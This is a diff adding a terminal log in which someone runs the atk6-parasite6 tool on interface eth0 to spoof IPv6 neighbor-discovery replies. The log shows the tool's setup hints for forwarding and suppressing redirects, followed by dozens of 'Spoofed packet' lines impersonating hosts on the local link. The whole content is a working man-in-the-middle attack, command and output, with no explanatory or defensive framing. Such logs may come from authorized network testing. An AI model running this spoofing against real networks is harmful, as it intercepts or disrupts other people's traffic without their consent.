@@ -1,0 +1,21 @@
+root@Host2:~# atk6-parasite6 eth0
+Remember to enable routing, you will denial service otherwise:
+ =>  echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
+Remember to prevent sending out ICMPv6 Redirect packets:
+ =>  ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP
+Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to end) ...
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:e6ff:fefe:8edd
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:b3ff:fe26:623c
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:fdff:fe54:5e9c
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:66ff:fe49:2f4
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:98ff:fee2:ccfb
+Spoofed packet to fe80::250:56ff:fec0:2 as fe80::218:2eff:fec3:6e8d
+...
+Spoofed packet to fe80::6894:caff:fe7f:14e3 as fe80::6b:d829:d842:1901
+Spoofed packet to fe80::6894:caff:fe7f:14e3 as fe80::6b:d85c:d842:1901
+Spoofed packet to fe80::6894:caff:fe7f:14e3 as fe80::6b:d88f:d842:1901
+Spoofed packet to fe80::6894:caff:fe7f:14e3 as fe80::6b:d8c2:d842:1901
+Spoofed packet to fe80::782b:fdff:fed7:eabb as 2001:620:40b:beaf:6894:caff:fe7f:14e3
+Spoofed packet to fe80::782b:fdff:fed7:eabb as fe80::10
+Spoofed packet to fe80::10 as fe80::782b:fdff:fed7:eabb
+...
